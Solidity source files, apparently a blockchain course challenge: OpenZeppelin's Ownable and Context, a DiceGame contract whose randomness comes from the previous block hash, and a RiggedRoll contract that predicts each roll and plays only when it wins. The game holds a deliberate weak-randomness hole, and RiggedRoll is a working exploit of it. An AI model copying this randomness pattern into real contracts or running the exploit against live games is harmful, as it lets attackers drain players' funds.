// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

pragma solidity >=0.8.0 <0.9.0;

//SPDX-License-Identifier: MIT

contract DiceGame {
  uint256 public nonce = 0;
  uint256 public prize = 0;

  event Roll(address indexed player, uint256 roll);
  event Winner(address winner, uint256 amount);

  constructor() payable {
    resetPrize();
  }

  function resetPrize() private {
    prize = ((address(this).balance * 10) / 100);
  }

  function rollTheDice() public payable {
    require(msg.value >= 0.002 ether, 'Failed to send enough value');

    bytes32 prevHash = blockhash(block.number - 1);
    bytes32 hash = keccak256(abi.encodePacked(prevHash, address(this), nonce));
    uint256 roll = uint256(hash) % 16;

    nonce++;
    prize += ((msg.value * 40) / 100);

    emit Roll(msg.sender, roll);

    if (roll > 2) {
      return;
    }

    uint256 amount = prize;
    (bool sent, ) = msg.sender.call{value: amount}('');
    require(sent, 'Failed to send Ether');

    resetPrize();
    emit Winner(msg.sender, amount);
  }

  receive() external payable {}
}

pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import './DiceGame.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

/// @notice Thrown when a failure occurs in withdrawing contract balance
error FailedToWithdraw();

/// @notice Thrown when there is not enough balance in the contract to play the DiceGame
error NotEnoughBalance();

/// @notice Thrown when a specified amount is too large for a given balance
/// @param amount The amount that was attempted to be used
/// @param balance The current balance that the amount was compared to
error AmountIsTooLarge(uint256 amount, uint256 balance);

/// @notice Thrown when a roll in the rigged game fails
error FailedToRoll();

/// @notice Thrown when a call to roll the dice in DiceGame contract fails
error CallingDiceGameRollFailed();

/// @title RiggedRoll
/// @author Indrek Jogi
/// @notice This contract allows for a manipulated roll in the DiceGame
/// @dev This contract inherits from OpenZeppelin's Ownable for owner-only functionality
contract RiggedRoll is Ownable {
  /// @notice The DiceGame contract instance
  DiceGame public diceGame;

  /// @notice Event emitted when a rigged roll has occurred
  /// @param roll The value of the roll
  event RiggRolled(uint256 roll);
  /// @notice Emitted when a withdrawal is made from the contract
  /// @param amount The amount that has been withdrawn
  event Withdrawal(uint256 amount);

  /// @notice Emitted when a roll operation in the DiceGame contract is successfully executed
  event SuccessfulRoll();

  /// @dev Initializes a new instance of the contract and sets the DiceGame contract
  /// @param diceGameAddress The address of the DiceGame contract
  constructor(address payable diceGameAddress) {
    diceGame = DiceGame(diceGameAddress);
  }

  /// @notice Allows the owner to withdraw a specified amount from the contract
  /// @dev Only callable by the owner
  /// @param addr The address to which the amount will be sent
  /// @param amount The amount to be withdrawn from the contract, must be less than or equal to the contract's balance
  function withdraw(address payable addr, uint256 amount) external payable onlyOwner {
    uint256 balance = address(this).balance;
    if (amount > balance) {
      revert AmountIsTooLarge(amount, balance);
    }

    (bool success, ) = addr.call{value: amount}('');
    if (!success) {
      revert FailedToWithdraw();
    }
    emit Withdrawal(amount);
  }

  /// @notice Allows anyone to make a rigged roll by manipulating the randomness
  /// @dev The contract must have a balance of at least 0.002 Ether
  function riggedRoll() external payable {
    if (address(this).balance < 0.002 ether) {
      revert NotEnoughBalance();
    }

    uint256 nonce = diceGame.nonce();
    bytes32 prevHash = blockhash(block.number - 1);
    bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
    uint256 roll = uint256(hash) % 16;

    emit RiggRolled(roll);

    if (roll <= 2) {
      try diceGame.rollTheDice{value: 0.0021 ether}() {
        emit SuccessfulRoll();
      } catch {
        revert CallingDiceGameRollFailed();
      }
    } else {
      revert FailedToRoll();
    }
  }

  /// @notice Function to receive Ether
  /// @dev This is a fallback function which allows the contract to receive Ether
  receive() external payable {}
}